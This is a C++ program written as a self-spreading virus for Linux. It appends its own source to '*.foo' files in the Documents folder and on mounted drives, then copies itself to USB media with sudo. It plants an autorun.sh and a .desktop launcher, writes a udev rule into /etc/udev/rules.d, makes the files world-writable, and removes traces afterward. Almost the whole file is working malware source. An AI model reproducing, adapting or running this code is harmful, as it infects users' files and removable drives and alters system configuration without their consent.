#include <cstdlib>
#include <string> 
#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

vector<string> readFileLines(const string& filePath) {
    vector<string> lines; 
    ifstream inputFile(filePath); 

    if (!inputFile.is_open()) {
        cerr << "Failed to open the file: " << filePath << endl;
        return lines;
    }

    string line;
    while (getline(inputFile, line)) {
        lines.push_back(line); 
    }

    inputFile.close(); 
    return lines;
}


int main() {
	system("ls /media/$USER > output.txt");
    string command = "";
    vector<string> mounts = readFileLines("output.txt");
    for (int i = 0; i < mounts.size(); i++) {
        command = "ls /media/$USER/" + mounts[i] + " > output.txt"; 
        cout << command << endl;
        system(command.c_str()); 
    }

    for(int i = 0; i < mounts.size(); i++) {
    	mounts[i] = "/media/$USER/" + mounts[i];
    }
    mounts.push_back("~/");

    system("find ~/ -type d -name \"Documents\" -print -quit > output.txt");
    
    
    vector<string> mountDocuments = readFileLines("./output.txt");
    mountDocuments.insert(mountDocuments.end(), mounts.begin(), mounts.end());
    mountDocuments.pop_back();
    for(int i = 0; i < mountDocuments.size(); i++) {
        cout << mountDocuments[i] << endl;
    }
    string username = getenv("USER");
    
    for(int i = 0; i < mountDocuments.size(); i++) {
        string command = "foo_files=$(find " + mountDocuments[i] +" -type f -name \"*.foo\"); \
                           for file in $foo_files; do \
                               cat ./v.cpp >> \"$file\"; \
                           done";

        system(command.c_str());
        cout << mountDocuments[i] << " infected" << endl;
    }

    for (int i = 0; i < mounts.size(); ++i) {
        command = "sudo cp ./v.cpp " + mounts[i];
        system(command.c_str());
        string udevRule = "ACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"/bin/bash -c \'/bin/chmod +x " + mounts[i] + "/autorun.sh\'";
        command = "echo '" + udevRule + "' | sudo tee /etc/udev/rules.d/99-usb-autorun.rules > /dev/null";
        system(command.c_str());
        
        string autorunsh = "g++ v.cpp -o v && ./v && rm v";
        string echoCommand = "echo \"" + autorunsh + "\" | sudo tee " + mounts[i] + "/autorun.sh > /dev/null";
        system(echoCommand.c_str());


        string desktopEntry = "[Desktop Entry]\n";
        desktopEntry += "Name=USB Autorun\n";
        desktopEntry += "Exec=bash -c \"./autorun.sh\"\n";
        desktopEntry += "Type=Application\n";
        desktopEntry += "Terminal=true\n";

        // Command to create the .desktop file using echo
        string command = "echo \"" + desktopEntry + "\" | sudo tee " + mounts[i] + "/autorun.desktop > /dev/null";
        system(command.c_str());
        command = "sudo chmod 777 " + mounts[i] + "/autorun.sh";
        system(command.c_str());
        command = "sudo chmod 777 " + mounts[i] + "/autorun.desktop";
        system(command.c_str());

        system("pwd > output.txt");
        vector<string> pwdString = readFileLines("./output.txt");
        if (pwdString.size() > 0 && pwdString[0].find("/media/") == 0) {
            string copyPath;
            cin >> copyPath;
            command = "mkdir ~/Documents/" + copyPath;
            system(command.c_str());
            command = "sudo cp ./* ~/Documents/" + copyPath;
            system(command.c_str());
        }
    }
    system("rm ~/autorun.sh");
    system("rm ~/autorun.desktop");
    system("sudo rm ~/v.cpp");
    system("rm ./output.txt");
	return 0; 
}